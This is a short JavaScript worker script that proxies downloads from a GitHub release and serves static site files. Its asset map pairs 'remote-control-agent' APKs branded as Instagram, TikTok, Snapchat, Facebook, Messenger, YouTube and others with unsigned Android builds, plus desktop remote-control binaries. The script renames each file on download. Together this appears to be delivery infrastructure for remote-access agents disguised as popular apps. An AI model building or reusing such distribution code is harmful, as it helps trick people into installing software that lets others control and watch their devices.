const RELEASE_BASE = "https://github.com/lovaerick93-source/test/releases/latest/download/";

const ASSET_MAP = {
  "remote-control-agent-default.apk": "android-agent-default-release-unsigned.apk",
  "remote-control-agent-instagram.apk": "android-agent-instagram-release-unsigned.apk",
  "remote-control-agent-twitter.apk": "android-agent-twitter-release-unsigned.apk",
  "remote-control-agent-facebook.apk": "android-agent-facebook-release-unsigned.apk",
  "remote-control-agent-linkedin.apk": "android-agent-linkedin-release-unsigned.apk",
  "remote-control-agent-messenger.apk": "android-agent-messenger-release-unsigned.apk",
  "remote-control-agent-youtube.apk": "android-agent-youtube-release-unsigned.apk",
  "remote-control-agent-snapchat.apk": "android-agent-snapchat-release-unsigned.apk",
  "remote-control-agent-tiktok.apk": "android-agent-tiktok-release-unsigned.apk",
  "remote-control-desktop.jar": "remote-control-desktop.jar",
  "remote-control-desktop.exe": "remote-control-desktop.exe",
};

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const m = url.pathname.match(/^\/static\/downloads\/(.+)$/);
    if (m) {
      const name = m[1];
      const asset = ASSET_MAP[name];
      if (asset) {
        const upstream = await fetch(RELEASE_BASE + asset, { redirect: "follow" });
        const headers = new Headers(upstream.headers);
        headers.set("Content-Disposition", `attachment; filename="${name}"`);
        return new Response(upstream.body, { status: upstream.status, headers });
      }
      return new Response("Not found", { status: 404 });
    }
    if (url.pathname.startsWith("/static/")) {
      url.pathname = url.pathname.slice("/static".length);
      return env.ASSETS.fetch(url.toString());
    }
    return env.ASSETS.fetch(request);
  },
};
